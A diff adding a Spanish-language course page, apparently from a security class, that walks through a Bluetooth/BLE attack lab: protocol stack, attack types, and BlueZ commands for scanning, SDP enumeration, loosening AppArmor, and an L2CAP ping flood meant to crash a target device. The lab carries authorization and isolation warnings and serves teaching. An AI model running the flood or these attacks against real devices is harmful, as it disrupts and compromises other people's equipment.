@@ -1,0 +1,110 @@
+---
+title: Laboratorio Práctico — Ataques Bluetooth y BLE
+sidebar_position: 4
+slug: laboratorio-bluetooth
+---
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+# Módulo 4 — Ataques Bluetooth y Protocolos Inalámbricos
+
+:::danger Prerrequisitos y alcance (Scope) — leer antes de ejecutar
+- **Autorización:** ejecutar únicamente sobre dispositivos propios o del laboratorio de clase, con el docente informado de la ventana de prueba.
+- **Aislamiento:** realizar las pruebas en un espacio cerrado (jaula de Faraday o salón aislado) para no interferir con dispositivos Bluetooth ajenos.
+- **Hardware:** adaptador Bluetooth 4.0/5.0 USB compatible con BlueZ (idealmente con soporte de modo monitor), opcionalmente Ubertooth One para sniffing pasivo.
+- **Software:** BlueZ (`bluez`, `bluez-tools`), Wireshark, y el número de MAC del dispositivo objetivo documentado previamente.
+:::
+
+## 4.1 Pila de protocolos Bluetooth (Classic vs. BLE)
+
+Para auditar Bluetooth es imperativo comprender la arquitectura de su pila de protocolos:
+
+| Capa de la pila | Bluetooth Classic (BR/EDR) | Bluetooth Low Energy (BLE) |
+|---|---|---|
+| Radio & Link Layer | 79 canales (1 MHz), frecuencia *hopping* | 40 canales (2 MHz), 3 canales de anuncio |
+| Capa de control | LMP (*Link Manager Protocol*) | LL (*Link Layer Controller*) |
+| Transporte de datos | L2CAP (*Logical Link Control and Adaptation*) | L2CAP (simplificado) |
+| Capa de servicios | RFCOMM (emulación de puerto serie) / SDP | ATT (*Attribute Protocol*) / GATT (*Profiles*) |
+
+## 4.2 Modos y tipos de ataque Bluetooth
+
+| Vector | Descripción | Severidad típica |
+|---|---|---|
+| **Bluejacking** | Envío no solicitado de mensajes o tarjetas vCard a un dispositivo mediante el protocolo OBEX (*Object Exchange*). No compromete datos, pero es un vector de phishing visual. | Baja |
+| **Bluesnarfing** | Acceso y sustracción no autorizada de información (contactos, fotos, mensajes, IMEI) del dispositivo víctima, aprovechando fallos de autenticación en OBEX/Push Server. | Alta |
+| **Bluebugging** | Explotación más severa: el atacante establece una conexión de canal de comandos AT sobre el perfil serial (RFCOMM), tomando control de llamadas, lectura de SMS y ejecución de comandos. | Crítica |
+| **L2CAP Ping of Death / DoS Flooding** | Denegación de servicio enviando paquetes de eco L2CAP sobredimensionados o con alta frecuencia (`l2ping -f`), agotando la pila de memoria del controlador objetivo y provocando reinicio (*kernel crash*). | Alta |
+| **BLE GATT Spoofing & MitM** | Intercepción de servicios GATT en BLE escribiendo valores arbitrarios en características sin autenticación (ej. cambiar velocidad o estado en un dispositivo médico o cerrojo inteligente). | Crítica |
+
+## 4.3 Guía paso a paso de ejecución del laboratorio
+
+Secuencia metodológica utilizada en clase para la auditoría sobre la máquina objetivo. Los comandos de BlueZ son idénticos en ambas distribuciones; las pestañas muestran las variaciones de entorno relevantes para QA.
+
+### Paso 1 — Inicialización de la interfaz HCI
+
+<Tabs groupId="distro">
+  <TabItem value="kali" label="Kali Linux">
+
+```bash
+# Levantar el adaptador Bluetooth local
+sudo hciconfig hci0 up
+
+# Verificar dirección MAC local y estado de la interfaz
+hciconfig -a
+```
+
+  </TabItem>
+  <TabItem value="parrot" label="Parrot OS">
+
+```bash
+# Si AppArmor bloquea bluetoothd, ponerlo en modo complain (solo en laboratorio)
+sudo aa-complain /usr/lib/bluetooth/bluetoothd
+
+# Levantar el adaptador Bluetooth local
+sudo hciconfig hci0 up
+
+# Verificar dirección MAC local y estado de la interfaz
+hciconfig -a
+```
+
+  </TabItem>
+</Tabs>
+
+### Paso 2 — Descubrimiento y escaneo (reconocimiento)
+
+```bash
+# Escaneo de dispositivos Bluetooth Classic activos
+sudo hcitool scan
+
+# Escaneo de dispositivos BLE (Bluetooth Low Energy)
+sudo hcitool lescan
+```
+
+### Paso 3 — Enumeración de servicios (SDP Browse)
+
+```bash
+# Enumerar perfiles y puertos RFCOMM en la MAC objetivo (ejemplo: AA:BB:CC:DD:EE:FF)
+sdptool browse AA:BB:CC:DD:EE:FF
+```
+
+### Paso 4 — Prueba de denegación de servicio (L2CAP Flood)
+
+```bash
+# Inyección masiva de paquetes L2ping (requiere privilegios root)
+sudo l2ping -i hci0 -s 600 -f AA:BB:CC:DD:EE:FF
+```
+
+:::warning Evidencia a recolectar en cada paso
+- **Paso 1-2:** captura de pantalla de `hciconfig -a` y de la lista de dispositivos descubiertos.
+- **Paso 3:** salida completa de `sdptool browse` (servicios/puertos expuestos).
+- **Paso 4:** captura Wireshark simultánea (`sudo wireshark -i bluetooth0`) mostrando el flood de paquetes L2CAP, más el comportamiento observado en el dispositivo objetivo (reinicio, desconexión, log de sistema).
+:::
+
+:::danger Detener la prueba
+El Paso 4 es un ataque de denegación de servicio real: puede colapsar o reiniciar el dispositivo objetivo. Ejecutar solo dentro de la ventana de prueba autorizada y detener inmediatamente (`Ctrl+C`) al confirmar el comportamiento — no es necesario sostener el flood más de lo requerido para documentar el hallazgo.
+:::
+
+## Siguiente paso
+
+Con la evidencia recolectada, documenta el hallazgo y aplica las contramedidas del [Módulo 5 — Mitigación y Reporte QA](/docs/mitigaciones-y-reporte).
